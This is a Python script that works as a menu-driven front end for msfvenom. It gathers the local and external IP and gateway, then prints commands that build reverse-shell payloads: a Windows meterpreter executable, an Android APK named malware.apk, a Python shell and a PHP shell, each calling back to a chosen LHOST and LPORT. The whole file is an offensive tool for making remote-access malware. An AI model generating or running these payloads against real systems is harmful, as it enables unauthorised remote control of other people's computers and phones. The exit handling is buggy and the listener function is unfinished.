import socket    
import netifaces
import time
import os
import sys
from requests import get
                                                                                              
def menutop():
    print(sep)
    print(f"Hostname:                        {hostname}")
    print(f"Local IP Address:                {localip}")
    print(f"External IP Address:             {externalip}")
    print(f"Gateway:                         {gatewayip}")
    print(sep)

def plat_sel():
    os.system("clear")
    menutop()
    print("1 - Windows\n2 - Android\n3 - Python\n4 - PHP\n5 - Exit")
    print(sep)
    option0 = input(">> ")

    if option0 == "1":
        #Windows
        print(">>> Windows platform selected <<<")
        platform0 = "msfvenom -p windows/x64/meterpreter/reverse_tcp"
        out_file = "-f exe -o reverse.exe"
        return platform0 , out_file
    elif option0 == "2":
        #Android       
        print(">>> Android platform selected <<<")
        platform0 = "msfvenom --platform android -p android/meterpreter/reverse_tcp" 
        out_file = "R -o malware.apk" 
        return platform0 , out_file
    elif option0 == "3":
        #Python  
        print(">>> Python venom selected <<<")
        platform0 = "msfvenom -p cmd/unix/reverse_python"     
        out_file = "-f raw -o shell.py" 
        return platform0 , out_file
    elif option0 == "4":
        #PHP
        print(">>> PHP venom selected <<<")
        platform0 = "msfvenom -p php/reverse_php "
        out_file = "-o shell.php"  
        return platform0 , out_file
    elif option0 == str("exit" or "5" or "q"): 
        print("byeeeeee")
        sys.exit()
    elif len(option0) == 0:
        os.system("clear")
        print("mount /dev/brain... you should select a platform first")
        time.sleep(3)
        plat_sel()
    return platform0 , out_file

def net_sel():
    os.system("clear")
    menutop()
    print("Write down your Host")
    print(f"Default IP [{localip}] ")
    print(sep)
    option2 = input(">> ")

    if len(option2) == 0:
        option2 = localip

    address_str = "LHOST="
    return option2, address_str    

def port_sel():
    os.system("clear")
    menutop()
    print("Which por are you going to use ???")
    print("(Default Port: 4444)")
    print(sep)
    option3 = input(">> ")
    if len(option3) == 0:
        option3 = "4444"

    port_str = "LPORT="
    return option3 , port_str

def scriptgen(platform0, spc, address_str, address0, port_str, port0, out_file):
    script = platform0 + spc + address_str+address0 + spc + port_str+port0 + spc + out_file
    print(script)


def listenergen():
    os.system("clear")
    menutop()
    print("Would you like to generate the listener ??? (y or n)")
    option4 = input(">> ")
    print(sep)
    if option4 == ("yes" or "ye" or "y" ):
        print("")
    elif option4 == ("no" or "n"):
        print("")

#Variables
sep = "---------------------------------------------------"
spc = " "
hostname = socket.gethostname()
localip = socket.gethostbyname(hostname)
externalip = get('https://api.ipify.org').content.decode('utf8')
gatewayip = netifaces.gateways()['default'][netifaces.AF_INET][0]

#Variables
platform, out_file = plat_sel()
network, str_network = net_sel()
port, str_port = port_sel()
scriptgen(platform, spc, str_network, network, str_port, port, out_file)
# listenergen()